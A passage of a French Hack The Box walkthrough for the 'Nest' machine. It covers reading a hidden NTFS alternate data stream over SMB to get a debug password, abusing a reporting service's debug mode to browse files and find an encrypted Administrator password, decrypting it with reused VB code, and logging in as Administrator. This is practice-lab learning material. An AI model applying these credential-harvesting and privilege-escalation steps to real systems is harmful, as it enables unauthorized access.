+<p>Lors de mes premières recherches sur la machine, j&rsquo;avais tenté de me connecter au service et j&rsquo;avais notamment pu voir une fonctionne de debugging, nécessitant un mot de passe. Cela tombe bien, l&rsquo;extrait ci-dessus mentionne un fichier <code>Debug Mode Password.txt</code>. Seul problème, le fichier semble vide (taille 0)&hellip;</p>
+
+<p>C&rsquo;est notamment ici qu&rsquo;intervient une astuce au niveau du système de fichiers, les streams !
+Pour faire simple, un stream est une séquence d&rsquo;octets contenants des informations sur un fichier. Il peut s&rsquo;agir de mots-clés, informations sur le propriétaire.. etc. Il est possible de créer différents streams.</p>
+
+<p>Avec <code>smbclient</code> on peut notamment voir ces informations grâce à la commande suivante.</p>
+
+<pre><code class="language-bash">smb: \C.smith\HQK Reporting\&gt; allinfo &quot;Debug Mode Password.txt&quot;
+altname: DEBUGM~1.TXT
+create_time:    Fri Aug  9 01:06:12 AM 2019 CEST
+access_time:    Fri Aug  9 01:06:12 AM 2019 CEST
+write_time:     Fri Aug  9 01:08:17 AM 2019 CEST
+change_time:    Fri Aug  9 01:08:17 AM 2019 CEST
+attributes: A (20)
+stream: [::$DATA], 0 bytes
+stream: [:Password:$DATA], 15 bytes
+</code></pre>
+
+<p>On observe ainsi un élément intéressant&hellip; Le stream par défaut ($DATA) est en effet vide, mais un second stream, nommé &ldquo;Password&rdquo; a été créé !
+<code>smbclient</code> offre également la possibilité de télécharger un fichier en spécifiant les steams souhaités.
+Ainsi&hellip;</p>
+
+<pre><code class="language-bash">smb: \C.smith\HQK Reporting\&gt; get &quot;Debug Mode Password.txt:Password:$Data&quot;
+getting file \C.smith\HQK Reporting\Debug Mode Password.txt:Password:$Data of size 15 as Debug Mode Password.txt:Password:$Data (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
+
+$ cat Debug\ Mode\ Password.txt:Password:\$Data 
+WBQ201953D8w 
+</code></pre>
+
+<p><br/></p>
+
+<h2 id="manipulation-du-service-de-reporting">Manipulation du service de Reporting</h2>
+
+<p>La résolution de cette machine se poursuit sur le second service identifié lors du scan de ports.
+On peut ainsi se connecter au service par l&rsquo;intermédiaire d&rsquo;un telnet.</p>
+
+<pre><code class="language-bash">$ telnet 10.10.10.178 4386
+Trying 10.10.10.178...
+Connected to 10.10.10.178.
+Escape character is '^]'.
+
+HQK Reporting Service V1.2
+
+&gt;help
+
+This service allows users to run queries against databases using the legacy HQK format
+
+--- AVAILABLE COMMANDS ---
+
+LIST
+SETDIR &lt;Directory_Name&gt;
+RUNQUERY &lt;Query_ID&gt;
+DEBUG &lt;Password&gt;
+HELP &lt;Command&gt;
+</code></pre>
+
+<p>Disposant maintenant du mot de passe de DEBUG, on peut lancer ce mode et ainsi récupérer un accès à plus de fonctionnalités.</p>
+
+<pre><code class="language-bash">&gt;DEBUG WBQ201953D8w
+
+Debug mode enabled. Use the HELP command to view additional commands that are now available
+&gt;HELP
+
+This service allows users to run queries against databases using the legacy HQK format
+
+--- AVAILABLE COMMANDS ---
+
+LIST
+SETDIR &lt;Directory_Name&gt;
+RUNQUERY &lt;Query_ID&gt;
+DEBUG &lt;Password&gt;
+HELP &lt;Command&gt;
+SERVICE
+SESSION
+SHOWQUERY &lt;Query_ID&gt;
+</code></pre>
+
+<p>La commande <code>SERVICE</code> nous permet de prendre connaissance du binaire utilisé ici tandis que la commande <code>SESSION</code> nous indique le répertoire courant.</p>
+
+<pre><code class="language-bash">&gt;SERVICE
+
+--- HQK REPORTING SERVER INFO ---
+
+Version: 1.2.0.0
+Server Hostname: HTB-NEST
+Server Process: &quot;C:\Program Files\HQK\HqkSvc.exe&quot;
+Server Running As: Service_HQK
+Initial Query Directory: C:\Program Files\HQK\ALL QUERIES
+
+&gt;SESSION
+
+--- Session Information ---
+
+Session ID: 32315e55-e64a-4b71-bf3f-124285e93ede
+Debug: True
+Started At: 3/29/2020 11:55:33 AM
+Server Endpoint: 10.10.10.178:4386
+Client Endpoint: 10.10.14.4:34380
+Current Query Directory: C:\Program Files\HQK\ALL QUERIES
+</code></pre>
+
+<p>Par la suite, les commandes <code>SETDIR</code>, <code>LIST</code> et <code>SHOWQUERY</code> sont utilisées. Dans les fait, on peut s&rsquo;en servir comme un système nous permettant de parcourir l&rsquo;arborescence de la machine. En effet, il est possible d&rsquo;associer ces dernières aux commandes classique <code>cd</code>, <code>ls</code> et <code>cat</code>.</p>
+
+<pre><code class="language-bash">&gt;SETDIR ../
+
+Current directory set to HQK
+
+&gt;LIST
+
+Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command
+
+ QUERY FILES IN CURRENT DIRECTORY
+
+[DIR]  ALL QUERIES
+[DIR]  LDAP
+[DIR]  Logs
+[1]   HqkSvc.exe
+[2]   HqkSvc.InstallState
+[3]   HQK_Config.xml
+
+Current Directory: HQK
+</code></pre>
+
+<p>Les répertoires <code>LDAP</code> et <code>Logs</code> attirent notre attention. C&rsquo;est notamment dans le répertoire <code>LDAP</code> qu&rsquo;on trouve notre bonheur.</p>
+
+<pre><code class="language-bash">&gt;SETDIR LDAP
+
+Current directory set to LDAP
+
+&gt;LIST
+
+Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command
+
+ QUERY FILES IN CURRENT DIRECTORY
+
+[1]   HqkLdap.exe
+[2]   Ldap.conf
+
+Current Directory: LDAP
+</code></pre>
+
+<p>Le fichier <code>Ldap.conf</code> révèle les informations souhaitées, à savoir le mot de passe, chiffré, de l&rsquo;administrateur !</p>
+
+<pre><code class="language-bash">&gt;SHOWQUERY 2
+
+Domain=nest.local
+Port=389
+BaseOu=OU=WBQ Users,OU=Production,DC=nest,DC=local
+User=Administrator
+Password=yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4=
+</code></pre>
+
+<p><br/></p>
+
+<h2 id="déchiffrement-et-escalade-de-privilège">Déchiffrement et escalade de privilège</h2>
+
+<p>Ok, on a maintenant un mot de passe chiffré pour le compte privilégié !
+Cette partie semblement directement utilisée par le processus afin de réaliser l&rsquo;authentification de l&rsquo;administrateur. Ainsi, cela veut dire que nous allons devoir interagir directement avec ce processus.</p>
+
+<p>On commence par le récupérer en local.</p>
+
+<p>Une fois cela fait, on peut décompiler le binaire. J&rsquo;utilise pour cela <code>dnSpy</code>. Je passe également ici la recherche d&rsquo;informations, mais on trouve rapidement la fonction de déchiffrement. Celle ci est identique à celle identifiée auparavant pour la partie utilisateur.</p>
+
+<p>À ce moment, deux options afin de déchiffrer le mot de passe :
+- Modifier le code du binaire, afin d&rsquo;afficher le mot de passe déchiffré, puis le recompiler et l&rsquo;exécuter ;
+- Utiliser une nouvelle fois notre environnement en ligne en modifiant les paramètres de la fonction.</p>
+
+<p>N&rsquo;étant pas très doué avec <code>dnSpy</code> et étant un peu blasé de cette machine, j&rsquo;ai pris la solution de facilité en réutilisant la même chose que pour l&rsquo;utilisateur :).</p>
+
+<pre><code class="language-bash">[...]
+Public Sub Main()
+        Console.WriteLine(&quot;Hello World&quot;)
+        Dim password As String
+        password = Decrypt(EncryptedString, &quot;667912&quot;, &quot;1313Rf99&quot;, 3, &quot;1L1SA61493DRV53Z&quot;, 256, 256)
+        Console.WriteLine(password)
+    End Sub
+[...]
+</code></pre>
+
+<p>Et ainsi : <code>XtH4nkS4Pl4y1nGX</code></p>
+
+<p>Tadaaaam!
+On peut filer récupérer le flag root.</p>
+
+<p>Pour la petite histoire, je suis d&rsquo;abord allé voir sur le partage <code>Users</code> et voici ce que j&rsquo;ai trouvé.</p>
+
+<pre><code class="language-bash">$ smbclient -U &quot;Administrator&quot; \\\\10.10.10.178\\Users  
+Unable to initialize messaging context
+Enter WORKGROUP\Administrator\'s password: 
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; cd Administrator\
+smb: \Administrator\&gt; ls
+  .                                   D        0  Fri Aug  9 17:08:23 2019
+  ..                                  D        0  Fri Aug  9 17:08:23 2019
+  flag.txt - Shortcut.lnk             A     2384  Fri Aug  9 17:10:15 2019
+
+    10485247 blocks of size 4096. 6544908 blocks available
+</code></pre>
+
+<p>Pas de flag root&hellip; Mais un fichier &ldquo;flag.txt&rdquo; (impossible à récupérer pour ma part).
+Après quelques secondes de réflexion, j&rsquo;ai repensé au fait que le partage <code>Users</code> était une copie/reproduction du répertoire <code>C:/Users</code> de la machine, et que disposant des droits administrateur, on pouvait tout simplement s&rsquo;y connecter.</p>
+
+<pre><code class="language-bash">$ smbclient -U &quot;Administrator&quot; \\\\10.10.10.178\\C$
+Enter WORKGROUP\Administrator\'s password: 
+Try &quot;help&quot; to get a list of possible commands.
+smb: \Users\Administrator\Desktop\&gt; ls
+  .                                  DR        0  Sun Jan 26 08:20:50 2020
+  ..                                 DR        0  Sun Jan 26 08:20:50 2020
+  desktop.ini                       AHS      282  Sat Jan 25 23:02:44 2020
+  root.txt                            A       32  Tue Aug  6 00:27:26 2019
+
+    10485247 blocks of size 4096. 6543963 blocks available
+
+</code></pre>
+
+<p>w00ted !</p>
+  </div>
+  
+
+<div class="post--navigation post--navigation-single">
+    
+    <a href="/fr/walkthroughs/hackthebox/forest/" class="post--navigation-prev">
+      <i aria-hidden="true" class="fa fa-chevron-left"></i>
+      <span class="navigation-tittle">Hack The Box - Forest</span>
+    </a>
+    
+    
+</div>
+
+
+  
+
+  
+    
+
+
+</article>
+
+
+        </div>
+        
+    
+  
+  
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-126182747-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+
+<script defer src="https://use.fontawesome.com/releases/v5.2.0/js/all.js"
+  integrity="sha384-4oV5EgaV02iISL2ban6c/RmotsABqE4yZxZLcYMAdG7FAPsyHYAPpywE9PJo+Khy"
+  crossorigin="anonymous">
+</script>
+
+
+    
+        
+        
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
+        
+        <script type="text/javascript">
+            hljs.configure({languages: []});
+            hljs.initHighlightingOnLoad();
+        </script>
+        
+        
+
+
+
+    
+
+
+
+    </body>
+</html>
